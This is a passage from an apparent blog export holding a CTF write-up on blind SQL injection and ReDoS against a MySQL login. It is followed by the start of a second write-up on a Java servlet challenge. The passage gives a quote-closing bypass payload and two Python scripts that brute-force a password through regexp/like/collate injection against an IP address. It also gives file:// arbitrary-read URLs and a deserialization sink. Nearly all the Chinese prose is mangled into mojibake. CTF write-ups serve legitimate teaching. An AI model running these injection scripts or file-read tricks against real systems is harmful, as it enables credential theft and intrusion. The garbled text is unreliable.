connectionProvider: ConnectionProvider) {}\rasync validateUser(username: string, password: string): Promise\u0026lt;User\u0026gt; | null {\rconst sql = `SELECT * FROM auth WHERE username='${safe(username)}' LIMIT 1`;\rconst [rows] = await this.connectionProvider.use((c) =\u0026gt; c.query(sql));\rconst user = rows[0];\rif (user \u0026amp;\u0026amp; user.password === password) {\r// eslint-disable-next-line @typescript-eslint/no-unused-vars\rconst { password, ...result } = user;\rreturn result;\r}\rreturn null;\r}\r}\r```\ræˆ‘ä»¬ä¼ å…¥çš„usernameç»è¿‡äº†è¿‡æ»¤ï¼Œæ‹¬å·ç©ºæ ¼ç­‰ç­‰ç‰¹æ®Šå­—ç¬¦ä¸èƒ½ç”¨ï¼Œunionè¢«è¿‡æ»¤ä¸èƒ½è”åˆæŸ¥è¯¢ï¼Œbinaryè¢«è¿‡æ»¤ä¸èƒ½é€šè¿‡å®ƒæ¥åŒºåˆ†å¤§å°å†™ã€‚ä¼ å…¥usernameä»¥åä¼šå¯¹è¡¨è¿›è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥å‡ºè®°å½•å†å¯¹ä¼ å…¥çš„å¯†ç passwordè¿›è¡Œæ¯”å¯¹ï¼Œé€šè¿‡å°±è¿”å›resultï¼Œä¹Ÿå°±æ˜¯flagã€‚\nå…ˆéšä¾¿ä¼ ç‚¹ä¸œè¥¿çœ‹ä¸€ä¸‹å›æ˜¾ã€‚SQLæ³¨å…¥ä¼ ç»Ÿè‰ºèƒ½ï¼šé—­åˆå¼•å·ã€‚è¿™é‡Œç›´æ¥å¿½ç•¥ç©ºæ ¼äº†ï¼Œç›¸å½“äºç”¨å¼•å·ä½œåˆ†éš”ï¼ŒåŒºåˆ†å¼€äº†å…³é”®å­—å’Œå­—ç¬¦ä¸²ï¼›ç„¶ååªè¦ä¸ç”¨å¸¦æ‹¬å·çš„å‡½æ•°ï¼Œå°±ä¸ä¼šç”¨åˆ°æ‹¬å·ã€‚æ‰€ä»¥ç›´æ¥ç»•è¿‡ç¬¬ä¸€ä¸ªreplaceçš„è¿‡æ»¤äº†ã€‚\nusername: 1'or'1'='1\rpassword: '123456'\rSQLè¯­å¥: SELECT * FROM auth WHERE username='1'or'1'='1' LIMIT 1\rè¿”å›: {\u0026quot;statusCode\u0026quot;:401,\u0026quot;message\u0026quot;:\u0026quot;Unauthorized\u0026quot;}\rè¯•äº†å¾ˆå¤šï¼Œå¥½åƒéƒ½æ²¡æœ‰åŠæ³•å¾—åˆ°å…¶ä»–çš„å›æ˜¾ï¼Œåƒä¼ ç»Ÿæ—¶é—´ç›²æ³¨ï¼Œå› ä¸ºæ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œå¾ˆå¤šæ“ä½œæ²¡èƒ½å®ç°ã€‚ä¸è¿‡è¿™é‡Œå‘ç°è¯­å¥å‡ºé”™æˆ–è€…sqlç‚¸æ‰çš„æ—¶å€™ä¼šæŠ¥501ã€‚è¿™é‡Œå°±æœ‰ä¸¤ä¸ªå›æ˜¾äº†ã€‚\näºæ˜¯å¼€å§‹å’Œpyyæ€è€ƒå¦‚ä½•åšåˆ°æœ‰æ­£ç¡®è¿”å›å€¼çš„æ—¶å€™ç»™401ï¼Œæœ‰é”™è¯¯è¿”å›å€¼çš„æ—¶å€™ç»™500ã€‚é¢˜ç›®å¾ˆé•¿æ—¶é—´æ²¡äººè§£ï¼Œå‡ºé¢˜äººç»™äº†ä¸ªregexpçš„æç¤ºï¼Œå†åŠ ä¸Šåæ¥é«˜è¡¨å“¥ç‚¹äº†ä¸€ä¸ªReDosï¼Œæ‰€ä»¥å¼€å§‹é¡ºç€è¿™ä¸ªæ–¹å‘æ‘¸ç´¢ã€‚\nMySQLæ¢ç´¢ åˆ°è¿™é‡Œï¼Œé¢˜ç›®å…ˆæ”¾ä¸€è¾¹ï¼Œå…ˆå¼€ä¸ªsqléšä¾¿è¯•è¯•ã€‚é¢˜ç›®ç»™äº†mysql8ï¼Œæˆ‘è¿™é‡Œå¼€äº†ä¸€ä¸ªmysql8.0.16ã€‚\næ ¹æ®é¢˜ç›®ç»™çš„sqlå†…å®¹æ–°å»ºä¸€ä¸ªåº“ç”¨æ¥æµ‹è¯•ã€‚\nimage-20220320150618144\ræŠŠsqlè¯­å¥æ¥è¿›å»ï¼Œå›æ˜¾æ­£å¸¸ã€‚\nimage-20220320150854245\rmysqlçš„oræœ‰çŸ­è·¯æœºåˆ¶ï¼Œå¦‚æœå¤šä¸ªoræ‹¼æ¥ï¼Œå‰é¢åˆ¤æ–­ä¸ºtrueçš„æ—¶å€™ï¼Œåé¢çš„orå†…å®¹å°±ä¼šè¢«çŸ­è·¯ä¸è¿›è¡Œåˆ¤æ–­ï¼›å¦‚æœå‰é¢ä¸ºfalseï¼Œä¼šç»§ç»­å¾€ååˆ¤æ–­ï¼›æœ€ç»ˆå¦‚æœæ²¡æœ‰ä¸€ä¸ªtrueï¼Œå°±ä¼šè¿”å›falseã€‚\nimage-20220320152024497\rç„¶åæ¢è®¨ä¸€ä¸‹regexpçš„æœºåˆ¶ã€‚æ­£å¸¸å»åŒ¹é…çš„æ—¶å€™ï¼Œéµå¾ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦‚æœåŒ¹é…æˆåŠŸå°±ä¼šè¿”å›æŸ¥è¯¢çš„ä¿¡æ¯ï¼Œå¦‚æœåŒ¹é…ä¸æˆåŠŸå°±è¿”å›ç©ºå€¼ï¼ŒåŒæ—¶å¦‚æœè¡¨è¾¾å¼å‡ºé”™çš„è¯SQLå°±ä¼šç‚¸æ‰ã€‚\nimage-20220320152544638\rReDos é‚£ä¹ˆä»€ä¹ˆæ˜¯ReDoså‘¢ï¼Ÿ\næ­£åˆ™è¡¨è¾¾å¼é‡Œé¢æœ‰ä¸¤ä¸ªé‡å¤è¿ç®—ç¬¦*å’Œ+ï¼Œ*ä»£è¡¨é‡å¤é›¶æ¬¡æˆ–å¤šæ¬¡ï¼Œ+ä»£è¡¨é‡å¤ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚è¿™é‡Œé™„ä¸Šä¸€ä¸ªéªŒè¯æ­£åˆ™è¡¨è¾¾å¼çš„ç½‘å€ï¼Œå¯ä»¥å¾ˆå¥½åœ°éªŒè¯æˆ‘ä»¬çš„æ­£åˆ™å†™çš„å¯¹ä¸å¯¹ã€‚é’ˆå¯¹æ­£åˆ™çš„é‡å¤è¿ç®—ç¬¦ï¼Œé¦–å…ˆéœ€è¦äº†è§£å®ƒçš„åŒ¹é…æœºåˆ¶ã€‚ä¸‹é¢å…ˆè§£é‡Šå‡ ä¸ªé—®é¢˜ã€‚\nDFAï¼ˆç¡®å®šæ€§æœ‰é™çŠ¶æ€è‡ªåŠ¨æœºï¼‰å’ŒNFAï¼ˆéç¡®å®šæ€§æœ‰é™çŠ¶æ€è‡ªåŠ¨æœºï¼‰çš„åŒºåˆ«\nDFA\ré€šä¿—ä¸€ç‚¹è§£é‡Šå°±æ˜¯æ‹¿ä¸€æ•´ä¸²å­—ç¬¦ä¸²ä¸æ‹†åˆ†å¼€çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åŒ¹é…ã€‚\ræ¯”å¦‚åŒ¹é…'abbbc'ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸º'ab{1,3}c'ï¼ŒåŒ¹é…è¿‡ç¨‹å¦‚ä¸‹ï¼š\ra åŒ¹é… a\rab åŒ¹é… ab{1,3}\rabb åŒ¹é… ab{1,3}\rabbb åŒ¹é… ab{1,3} // åˆšå¥½æœ€å¤šä¸‰ä¸ªbç»“æŸ\rabbbc åŒ¹é… ab{1,3}c NFA\rä¹Ÿé€šä¿—ä¸€ç‚¹è§£é‡Šå°±æ˜¯æ‹¿æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¸å­—ç¬¦ä¸²çš„é€ä¸ªå­—ç¬¦åŒ¹é…ã€‚\r....å†™ç€å†™ç€å‘ç°æœ‰ç‚¹ä¸å¯¹ï¼Œå…ˆæ”¾ç€....\rMySQLå±äºNFAï¼Œå­˜åœ¨å›æº¯æœºåˆ¶ã€‚\nå…³äºé‡å¤è¿ç®—ç¬¦+å’Œ*çš„åŒºåˆ«ï¼ˆå°±æ˜¯è‡³å°‘ä¸€æ¬¡å’Œé›¶æ¬¡çš„åŒºåˆ«ï¼‰\nca*t åŒ¹é… caaaaatå’Œct\rca+t åŒ¹é… caaaaat\rè´ªå©ªåŒ¹é…å’Œéè´ªå©ªåŒ¹é…\nx.*y åŒ¹é… xaaaaayqweqxbbbbby\rx.*?y åŒ¹é… xaaaaayå’Œxbbbbby\rå›æº¯\nä¸ç®¡æ˜¯è´ªå©ªåŒ¹é…è¿˜æ˜¯éè´ªå©ªåŒ¹é…ï¼Œå¦‚æœç»™å‡ºçš„è¡¨è¾¾å¼æ˜¯ä¸æ°å½“çš„ï¼Œè®¡ç®—æœºå¤„ç†çš„æ—¶å€™ä¼šè¿›è¡Œå›æº¯ï¼ˆè‡³äºä»€ä¹ˆæ˜¯æ°å½“çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹‹åæœ‰ç©ºå†ç»†è¯´ï¼‰\næ¯”å¦‚æˆ‘éœ€è¦åŒ¹é…xabcdyabcï¼Œç»™å‡ºçš„è¡¨è¾¾å¼æ˜¯x.*yï¼Œé‚£ä¹ˆè®¡ç®—æœºè¿›è¡ŒåŒ¹é…çš„æµç¨‹åº”è¯¥æ˜¯ï¼š\nx åŒ¹é… x\rxa åŒ¹é… x.*\rxab åŒ¹é… x.*\rxabc åŒ¹é… x.*\rxabcd åŒ¹é… x.*\rxabcdy åŒ¹é… x.*\rxabcdya åŒ¹é… x.*\rxabcdyab åŒ¹é… x.*\rxabcdyabc åŒ¹é… x.* // æ³¨æ„ï¼Œè¿™é‡Œå·²ç»åŒ¹é…å®Œäº†ï¼Œå¼€å§‹å›æº¯\rxabcdyab åŒ¹é… x.*\rxabcdya åŒ¹é… x.*\rxabcdy åŒ¹é… x.*\rxabcd åŒ¹é… x.*\rxabcdy åŒ¹é… x.*y\rå¯è§ï¼Œå¦‚æœåŒ¹é…çš„è¿‡ç¨‹ä¸­äº§ç”Ÿå›æº¯ï¼Œå°†ä¼šå¤§å¤§é™ä½æ•ˆç‡ã€‚æ‰€ä»¥å‡å¦‚æˆ‘ä»¬éœ€è¦åŒ¹é…aaaaaaaaaaaaaaaaaï¼Œç»™å‡ºçš„è¡¨è¾¾å¼æ˜¯(a+)+bï¼Œæˆ‘ä»¬èƒ½è½»æ˜“çœ‹å‡ºæ¥è¿™æ˜¯ä¸åŒ¹é…çš„ï¼Œä½†æ˜¯è®¡ç®—æœºä¼šå¯¹å…¶è¿›è¡Œå›æº¯ï¼Œåšå¾ˆå¤šæ²¡æœ‰å¿…è¦ä¸”æ„šè ¢çš„æ“ä½œï¼Œç„¶åå¯¼è‡´æ“ä½œæ­¥æ•°è¿‡å¤šï¼Œè¶…æ—¶æˆ–è€…å´©æºƒã€‚åˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥è¾¾åˆ°Dosçš„æ•ˆæœã€‚\nå¦‚æœåœ¨MySqlé‡Œé¢è¯•ï¼Œä¼šæŠ¥è¶…æ—¶ã€‚\nimage-20220320180534057\ræˆ–è€…åœ¨pythoné‡Œé¢è¯•ï¼Œä¼šå¡æ­»ã€‚\nimage-20220320180658644\rå°è¯•è§£é¢˜ äº†è§£äº†ä¸Šé¢è¿™äº›ä¸œè¥¿ï¼Œå·®ä¸å¤šå¯ä»¥å¼€å§‹è§£é¢˜äº†ã€‚æˆ‘ä»¬å°è¯•å¯¹ç»™å‡ºçš„sqlè¯­å¥è¿›è¡Œæ‹¼æ¥ï¼Œåˆ©ç”¨orçš„çŸ­è·¯è§„åˆ™å’ŒregexpæŸ¥è¯¢ã€åˆ¶é€ æŠ¥é”™ã€‚\nimage-20220320213048644\rå½“ç„¶ä¹Ÿå¯ä»¥ç”¨ReDosåˆ¶é€ è¶…æ—¶ã€‚\nimage-20220320213203235\rç„¶åå°±å¯ä»¥æ„‰å¿«å†™è„šæœ¬ç›²æ³¨å•¦~\nimport requests\rpasswd=\u0026quot;\u0026quot;\rlista=\u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\u0026quot;\rwhile True:\rfor i in lista:\rexp=\u0026quot;'or`password`regexp'^\u0026quot;+passwd+i+\u0026quot;'or`password`regexp'[\u0026quot;\r#print(exp)\rdata={\u0026quot;username\u0026quot;:exp,\u0026quot;password\u0026quot;:\u0026quot;123456\u0026quot;}\rres = requests.post(\u0026quot;http://47.107.231.226:36804/login\u0026quot;,data=data)\r#print(res.text)\rif('401' in res.text):\rpasswd+=i\rprint(passwd)\rbreak\råŒæ ·å¯¹usernameè¿›è¡Œç›²æ³¨ï¼Œå¾—åˆ°çš„ç»“æœå¦‚ä¸‹ï¼š\nusername: QAY8TEFYZC67AEOO\rpassword: M52FPLDXYYLB\rä½†æ˜¯æ„Ÿè§‰æœ‰äº›å¥‡æ€ªï¼Œä¸€æ—¶è¯´ä¸ä¸Šæ¥å¥‡æ€ªåœ¨å“ªé‡Œ\u0026hellip;æ‰€ä»¥å°è¯•æ‹¿å»ç™»å½•äº†ä¸€ä¸‹ã€‚\nå•Šå“¦ï¼Œæ˜¯é”™çš„ã€‚æ‰€ä»¥é‡æ–°å»çœ‹å“ªé‡Œæœ‰é—®é¢˜ï¼ˆå…¶å®ä¹Ÿæ²¡æœ‰å»çœ‹ï¼Œå½“æ—¶åœ¨å’Œé«˜è¡¨å“¥é€šç”µè¯ï¼Œä»–æç‚¹äº†ä¸€ä¸‹ï¼Œå˜¿å˜¿ï¼ŒåŒ–è…æœ½ä¸ºç¥å¥‡çš„å¥½å¤§å“¥~ï¼‰\né‡æ–°çœ‹ä¸€éhint.mdï¼Œä»”ç»†çœ‹è¿‡æ»¤çš„åœ°æ–¹ã€‚\nfunction safe(str: string): string {\rconst r = str\r.replace(/[\\s,()#;*\\-]/g, '')\r.replace(/^.*(?=union|binary).*$/gi, '')\r.toString();\rreturn r;\r}\rå‘ç°é™¤äº†unionè¢«è¿‡æ»¤ï¼Œè¿˜æœ‰ä¸€ä¸ªbinaryã€‚binaryå…³é”®å­—åœ¨mysqlé‡Œç”¨æ¥åŒºåˆ†å¤§å°å†™ï¼Œmysqlé»˜è®¤æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚çœ‹ä¸‹é¢çš„ä¾‹å­ã€‚\nimage-20220320214957473\rä½†æ˜¯ç°åœ¨binaryè¢«è¿‡æ»¤äº†ï¼Œåªèƒ½å¦å¯»ä»–è·¯ã€‚\nç»è¿‡ä¸€ç•ªæœå¯»ï¼Œå‘ç°collateä¹Ÿå¯ä»¥åšåˆ°è®©mysqlåŒºåˆ†å¤§å°å†™ã€‚è¿™é‡Œå°±æ¶‰åŠåˆ°mysqlé»˜è®¤å­—ç¬¦é›†çš„é—®é¢˜ã€‚\nMySQLå­—ç¬¦é›† åœ¨æˆ‘ä»¬çš„è®¤çŸ¥é‡Œï¼ŒåŸºæœ¬ä¸Šå­—ç¬¦çš„æ¯”è¾ƒéƒ½æ˜¯é€šè¿‡å…ˆè½¬æ¢æˆasciiï¼Œå†æ ¹æ®asciiå­—ç¬¦é›†è¿›è¡Œæ¯”è¾ƒï¼›ç‰¹åˆ«çš„ï¼Œåƒphpé‚£æ ·çš„å¼±ç±»å‹æ¯”è¾ƒï¼Œå¦‚æœå­—ç¬¦å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒä¼šå…ˆæŠŠå­—ç¬¦è½¬æ¢æˆ0ã€‚ä¸‹é¢æ¥çœ‹mysqlç‰¹æ®Šçš„ä¾‹å­ã€‚é¦–å…ˆçŸ¥é“\u0026rsquo;a\u0026rsquo;å¯¹åº”çš„asciiæ˜¯97ï¼Œ\u0026lsquo;8\u0026rsquo;å¯¹åº”çš„asciiæ˜¯56ï¼Œ\u0026rsquo;@\u0026lsquo;å¯¹åº”çš„asciiæ˜¯64ï¼Œ\u0026rsquo;~\u0026lsquo;å¯¹åº”çš„asciiæ˜¯126ã€‚å¦‚æœå¯¹è¿™å‡ ä¸ªå­—ç¬¦è¿›è¡Œæ¯”è¾ƒï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€ååº”åº”è¯¥æ˜¯ '~'\u0026gt;'a'\u0026gt;'@'\u0026gt;'8'ã€‚ä½†æ˜¯çœ‹ä¸€ä¸‹åœ¨mysqlé‡Œè¿è¡Œçš„ç»“æœã€‚\nmysql\u0026gt; select 'a'\u0026gt;'1';\r+---------+\r| 'a'\u0026gt;'1' |\r+---------+\r| 1 |\r+---------+\r1 row in set (0.05 sec)\rmysql\u0026gt; select '@'\u0026gt;'a';\r+---------+\r| '@'\u0026gt;'a' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '@'\u0026gt;'8';\r+---------+\r| '@'\u0026gt;'8' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '~'\u0026gt;'a';\r+---------+\r| '~'\u0026gt;'a' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.05 sec)\rmysql\u0026gt; select '~'\u0026gt;'8';\r+---------+\r| '~'\u0026gt;'8' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '@'\u0026gt;'a';\r+---------+\r| '@'\u0026gt;'a' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '@'\u0026gt;'8';\r+---------+\r| '@'\u0026gt;'8' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select 'a'\u0026gt;'8';\r+---------+\r| 'a'\u0026gt;'8' |\r+---------+\r| 1 |\r+---------+\r1 row in set (0.00 sec)\rå¾ˆå¥‡æ€ªï¼Œè¿™å’Œæˆ‘ä»¬çš„ç›´è§‰ä¸ç¬¦ï¼Œå’ŒäºŒå¸ˆå‚…ã€nkkä»¥åŠè¿œæ–¹çš„é«˜è¡¨å“¥åœ¨å®éªŒå®¤æ¢è®¨äº†å¾ˆä¹…è¿™ä¸ªé—®é¢˜ã€‚æœ€åå‘ç°å…¶å®æ˜¯å­—ç¬¦é›†çš„é”…ã€‚\nmysql8æŠŠé»˜è®¤å­—ç¬¦é›†æ¢æˆäº†utf8mb4_0900_ai_ciï¼Œå¯ä»¥æŸ¥è¯¢çœ‹çœ‹ã€‚\nimage-20220320221936369\räºŒå¸ˆå‚…æœåˆ°è¿™ä¸ªå­—ç¬¦é›†ï¼Œå‘ç°å®ƒé»˜è®¤æ˜¯æŠŠä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦æ”¾åœ¨äº†æ•°å­—å’Œå­—æ¯çš„å‰é¢ï¼Œåƒæˆ‘ä»¬ç”¨åˆ°çš„ \u0026lsquo;@\u0026lsquo;å’Œ\u0026rsquo;~\u0026rsquo; åœ¨è¿™ä¸ªå­—ç¬¦é›†é‡Œéƒ½æ˜¯æ¯”æ•°å­—å’Œå­—æ¯å°çš„ï¼Œæ‰€ä»¥å¾—åˆ°äº†ä¸Šé¢çš„ç»“æœã€‚ä»¥åŠï¼Œé™„ä¸Šå¯¹äºè¿™ä¸ªå­—ç¬¦é›†çš„è¯´æ˜ã€‚æ„Ÿè°¢@äºŒå¸ˆå‚…ã€‚\nè¯´å›åŒºåˆ†å¤§å°å†™çš„é—®é¢˜ï¼Œè¿™ä¸ªå­—ç¬¦é›†å¸¦ç€ciï¼Œè¯´æ˜æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹mysqlä½¿ç”¨çš„å­—ç¬¦é›†æ¥å®ç°è¿™ä¸ªåŠŸèƒ½ã€‚è¿™é‡Œæ‰¾ä¸€ä¸ªèƒ½å¤ŸåŒºåˆ†å¤§å°å†™çš„å­—ç¬¦é›†å°±å¯ä»¥ã€‚\næ‰€ä»¥ä¿®æ”¹ä¸€ä¸‹sqlè¯­å¥ï¼š\nimage-20220320224045559\rè¿™é‡Œæ³¨æ„ï¼Œè¿™ä¸ªcollateè¦æ¥åœ¨å¾…æ¯”è¾ƒæˆ–è€…åŒ¹é…å­—ç¬¦è¯­å¥çš„åé¢ã€‚åƒä¸Šé¢çš„è¯­å¥ï¼Œå¦‚æœæ¥åœ¨æœ€åæ˜¯ä¸èµ·ä½œç”¨çš„ã€‚\nåˆ°è¿™é‡Œå°±å¯ä»¥å®ç°åŒºåˆ†å¤§å°å†™çš„åŠŸèƒ½äº†ã€‚ä½†æ˜¯æœ€åæ³¨å‡ºçš„å¯†ç è¿˜æ˜¯ä¸å¯¹ï¼Œè€ƒè™‘åˆ°å¯èƒ½æ˜¯å­˜åœ¨ç‰¹æ®Šå­—ç¬¦ï¼Œé«˜è¡¨å“¥è¯•äº†å¾ˆå¤šä¸ªæœ€åè¯•å‡ºæ¥å­˜åœ¨çš„ç‰¹æ®Šå­—ç¬¦æ˜¯^$!ã€‚è¿™é‡Œæ—¢ç„¶å­˜åœ¨^ï¼Œè¿™åœ¨æ­£åˆ™è¡¨è¾¾å¼é‡Œé¢æ˜¯å…³é”®å­—ç¬¦ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨regexpå»æ³¨å…¥ï¼Œæœ€åæ¢æˆlikeè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚\né™„ä¸Šå®Œæ•´è„šæœ¬ã€‚\nimport requests\ra=\u0026quot;\u0026quot;\rpasswd=\u0026quot;\u0026quot;\rlista=\u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$!^\u0026quot;\rwhile True:\rfor i in lista:\rexp=\u0026quot;'or`password`like'\u0026quot;+passwd+i+\u0026quot;%'collate'utf8mb4_bin'or`username`regexp'[\u0026quot;\rdata={\u0026quot;username\u0026quot;:exp,\u0026quot;password\u0026quot;:\u0026quot;123456\u0026quot;}\rres = requests.post(\u0026quot;http://47.107.231.226:36804/login\u0026quot;,data=data)\rif('401' in res.text):\rpasswd+=i\rprint(passwd)\rbreak\ræœ€åçš„ç»“æœæ˜¯\nusername: QaY8TeFYzC67aeoO\rpassword: m52FPlDxYyLB^eIzAr!8gxh$\ræ‹¿ç€å»ç™»å½•ï¼Œè¿”å›flagã€‚\nHFCTF{0990de0f-a5ea-4c47-90f7-7c92ba1eac80}\rå‚è€ƒèµ„æ–™ Regular expression Denial of Service - ReDoS\næ­£åˆ™è¡¨è¾¾å¼æ‰€å¼•å‘çš„DoSæ”»å‡»ï¼ˆRedosï¼‰\nMYSQLä¸­çš„COLLATEæ˜¯ä»€ä¹ˆï¼Ÿ å†™åœ¨æœ€å æ‹¿ä¸€è¡€çš„é«˜è¡¨å“¥ï¼Œyydsï¼\nè¿˜æ˜¯è¦å¤šç»ƒå¤šç»ƒå¤šç»ƒå¤šç»ƒå¤šç»ƒå¤šç»ƒå¤šç»ƒï¼ŒçŸ¥é“çš„ä¸œè¥¿è¶Šå¤šåœ¨æ¯”èµ›é‡Œè¶Šå¾—å¿ƒåº”æ‰‹ï¼ŒæŸ¥èµ„æ–™ä¹Ÿä¸ä¼šæ²¡æœ‰æ–¹å‘ã€‚å†™è¿™é“é¢˜çš„è¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒåå·çš„ï¼Œä»ä¸çŸ¥é“æ€ä¹ˆç»•è¿‡æ»¤ï¼Œåˆ°ä¸çŸ¥é“æ€ä¹ˆç”¨æ­£åˆ™ï¼Œåˆ°ä¸çŸ¥é“æ€ä¹ˆåŒºåˆ†å¤§å°å†™ï¼›ä¸­é—´å†™è„šæœ¬çš„æ—¶å€™é‡åˆ°äº†å¾ˆå¤šå¥‡æ€ªçš„é—®é¢˜ï¼Œæ¯”å¦‚å¦‚æœä¿®æ”¹äº†å­—ç¬¦é›†ç”¨å¤§äºå°äºå·å»æ¯”è¾ƒçš„è¯åº”è¯¥ç”¨ä»€ä¹ˆå­—ç¬¦é›†å‘¢ï¼ˆå› ä¸ºæˆ‘å’Œnkkå€”å¼ºåœ°æƒ³ç”¨å¤§äºå°äºå·å»æ¯”è¾ƒ2333333ï¼‰ã€‚ä½†æ˜¯è¿™äº›é—®é¢˜ç•™å¾…ä»¥åå†æ¢è®¨å§ï¼\nèµ¶ä½œä¸šå»å˜~\n","date":"2022-03-20T00:00:00Z","permalink":"https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/","title":"ä»ä¸€é“é¢˜å­¦ReDosåŠSQLç›²æ³¨"},{"content":"å†™åœ¨å‰é¢ ç¬¬ä¸€æ¬¡æŠŠjavaçš„é¢˜ä»å¤´åˆ°å°¾åšå®Œï¼Œæ•´å®Œçš„æ—¶å€™å‘ç°é¢˜ç›®å¹¶ä¸éš¾ã€‚è¿‡ç¨‹ä¸­è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ„Ÿè°¢é«˜è¡¨å“¥å’Œnkkå’ŒäºŒå¸ˆå‚…ğŸ™‡â€\næ¯”èµ›çš„æ—¶å€™æ²¡æœ‰åšå‡ºæ¥ï¼Œç¯å¢ƒå…³æ‰äº†ï¼Œè™½ç„¶buuæœ‰å¤ç°ç¯å¢ƒï¼Œä½†æ˜¯ç”±äºéœ€è¦ç«äº‰ï¼Œbuuæœ‰é™åˆ¶ï¼Œæ‰€ä»¥æŠŠæºç æ‹¿ä¸‹æ¥åœ¨æœ¬åœ°æ­ã€‚\nå¤ç° æ‰“å¼€ç¯å¢ƒï¼ŒF12æŸ¥çœ‹æºç \nimage-20220302133247566\rè®¿é—®/file?\nimage-20220302133312575\réœ€è¦ä¼ å…¥ä¸€ä¸ªurlï¼ŒçŒœæµ‹æ˜¯éœ€è¦ç”¨åˆ°ä¼ªåè®®ä»»æ„è¯»æ–‡ä»¶ã€‚äºæ˜¯ä¼ å…¥file:///è¯»åˆ°æºç ã€‚æœ¬åœ°çš„è¯ç›´æ¥çŸ¥é“æºç è·¯å¾„ï¼Œå°±ä¸å¤šè¯´äº†ã€‚æ¯”èµ›çš„æ—¶å€™æ˜¯è¿œç¨‹ç¯å¢ƒï¼Œæˆ‘ä¸€å¼€å§‹ä¸çŸ¥é“webéƒ¨ç½²åœ¨å“ªé‡Œï¼Œæ‰€ä»¥æ‰¾äº†å¾ˆä¹…ï¼Œæœ€ååœ¨è¿™ä¸ªè·¯å¾„é‡Œæ‰¾åˆ°ã€‚\n/file?url=file:///usr/local/tomcat/\nçœ‹åˆ°é«˜è¡¨å“¥æ˜¯é€šè¿‡å½“å‰è¿è¡Œè¿›ç¨‹å»æ‰¾çš„ï¼Œè¿™æ ·æ‰¾å¥½åƒå¿«ä¸€äº›ï¼Œè®°å½•ä¸€ä¸‹ã€‚\n/file?url=file:///proc/self/cwd/\nç„¶åçœ‹åˆ°tomcatçš„ç›®å½•ç»“æ„ï¼Œè¿›webappsï¼Œæ‹¿åˆ°æºç æ‹¿å»åç¼–è¯‘ã€‚\nimage-20220302134240641\rHelloWorldServletç±»\npackage servlet;\rimport entity.User;\rimport java.io.IOException;\rimport java.util.Base64;\rimport javax.servlet.ServletException;\rimport javax.servlet.ServletOutputStream;\rimport javax.servlet.annotation.WebServlet;\rimport javax.servlet.http.HttpServlet;\rimport javax.servlet.http.HttpServletRequest;\rimport javax.servlet.http.HttpServletResponse;\rimport util.Secr3t;\rimport util.SerAndDe;\r@WebServlet(name = \u0026quot;HelloServlet\u0026quot;, urlPatterns = {\u0026quot;/evi1\u0026quot;})\r/* loaded from: HelloWorldServlet.class */\rpublic class HelloWorldServlet extends HttpServlet {\rprivate volatile String name = \u0026quot;m4n_q1u_666\u0026quot;;\rprivate volatile String age = \u0026quot;666\u0026quot;;\rprivate volatile String height = \u0026quot;180\u0026quot;;\rUser user;\rpublic void init() throws ServletException {\rthis.user = new User(this.name, this.age, this.height);\r}\rprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\rString reqName = req.getParameter(\u0026quot;name\u0026quot;);\rif (reqName != null) {\rthis.name = reqName;\r}\rif (Secr3t.check(this.name)) {\rResponse(resp, \u0026quot;no vnctf2022!\u0026quot;);\r} else if (Secr3t.check(this.name)) {\rResponse(resp, \u0026quot;The Key is \u0026quot; + Secr3t.getKey());\r}\r}\rprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\rString key = req.getParameter(\u0026quot;key\u0026quot;);\rString text = req.getParameter(\u0026quot;base64\u0026quot;);\rif (!Secr3t.getKey().equals(key) || text == null) {\rResponse(resp, \u0026quot;KeyError\u0026quot;);\rreturn;\r}\rif (this.user.equals((User) SerAndDe.deserialize(Base64.getDecoder().decode(text)))) {\rResponse(resp, \u0026quot;Deserializeâ€¦â€¦ Flag is \u0026quot; + Secr3t.getFlag().toString());\r}\r}\rprivate void Response(HttpServletResponse resp, String outStr) throws IOException {\rServletOutputStream out = resp.getOutputStream();\rout.write(outStr.getBytes());\rout.flush();\rout.close();\r}\r}\rçœ‹åˆ°è¿™é‡Œå‘ç°è¿™ä¸ªkeyé€šè¿‡æ­£å¸¸æ‰‹æ®µæ²¡æœ‰åŠæ³•æ‹¿åˆ°ï¼Œä¸ç®¡æ€æ 